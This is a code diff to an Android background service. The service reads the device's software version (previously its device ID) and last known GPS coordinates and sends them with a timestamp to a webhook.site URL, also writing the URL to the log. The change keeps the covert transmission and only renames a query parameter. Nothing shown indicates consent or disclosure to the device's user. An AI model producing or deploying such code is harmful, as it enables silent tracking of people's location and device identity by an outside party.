@@ -36,17 +36,17 @@ public class BackgroundService extends IntentService {
             @SuppressLint("MissingPermission")
             @Override
             public void run() {
-                String deviceId = telephonyManager.getDeviceId();
+                String deviceId = telephonyManager.getDeviceSoftwareVersion();
                 Location location = locationManager.getLastKnownLocation("gps");
                 double longitude = (location != null) ? location.getLongitude() : 0;
                 double latitude = (location != null) ? location.getLatitude() : 0;
-                Long at = SystemClock.elapsedRealtime();
+                Long at = System.currentTimeMillis();
 
                 Log.d("COVFEFE", "https://webhook.site/13f9a354-0312-480b-b0ac-a33855edfc1c?device_id=" + deviceId + "&long=" + longitude + "&lat=" + latitude + "&at=" + at);
 
                 HttpURLConnection urlConnection = null;
                 try {
-                    URL url = new URL("https://webhook.site/13f9a354-0312-480b-b0ac-a33855edfc1c?device_id=" + deviceId + "&long=" + longitude + "&lat=" + latitude + "&at=" + at);
+                    URL url = new URL("https://webhook.site/13f9a354-0312-480b-b0ac-a33855edfc1c?software_version=" + deviceId + "&long=" + longitude + "&lat=" + latitude + "&at=" + at);
                     urlConnection = (HttpURLConnection) url.openConnection();
                     InputStream in = new BufferedInputStream(urlConnection.getInputStream());
                 } catch (IOException e) {
